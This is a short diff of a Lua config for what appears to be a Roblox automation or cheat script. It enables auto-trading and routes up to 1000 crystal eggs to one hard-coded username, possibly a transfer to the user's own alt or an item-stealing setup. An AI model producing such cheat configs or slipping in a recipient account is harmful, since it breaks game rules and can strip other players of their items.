@@ -17,13 +17,13 @@ getgenv().Config = {
             SelectedPetTypes = {}, -- Pet IDs to farm when SelectiveFarm is true (e.g., {"dog", "cat"})
         },
         AutoTrade = {
-            Enabled = false, -- Enable auto trading
-            AutoAcceptTrades = true, -- Accept incoming trade requests
-            Usernames = {}, -- Players to send trades to
-            TradeMode = "all", -- "all" = everything in categories, "specific" = only Items list
-            Categories = {}, -- {"pets", "toys", "food", "transport", "gifts", "stickers", "pet_accessories", "roleplay"}
-            Items = {}, -- Item IDs when TradeMode = "specific"
-            ItemCounts = {}, -- Max count per item in Items array
+            Enabled = true, -- Enable auto trading
+            AutoAcceptTrades = false, -- Accept incoming trade requests
+            Usernames = {"Growgardenaccount359"}, -- Players to send trades to
+            TradeMode = "specific", -- "all" = everything in categories, "specific" = only Items list
+            Categories = {"pets"}, -- {"pets", "toys", "food", "transport", "gifts", "stickers", "pet_accessories", "roleplay"}
+            Items = {"pet_recycler_2025_crystal_egg"}, -- Item IDs when TradeMode = "specific"
+            ItemCounts = {1000}, -- Max count per item in Items array
             PetTypes = {}, -- {} = all, {"regular", "neon", "mega"}
             Ages = {}, -- {} = all, {1, 2, 3, 4, 5, 6}
             AutoLeaveAfterTrades = false, -- Leave trade area after completing trades
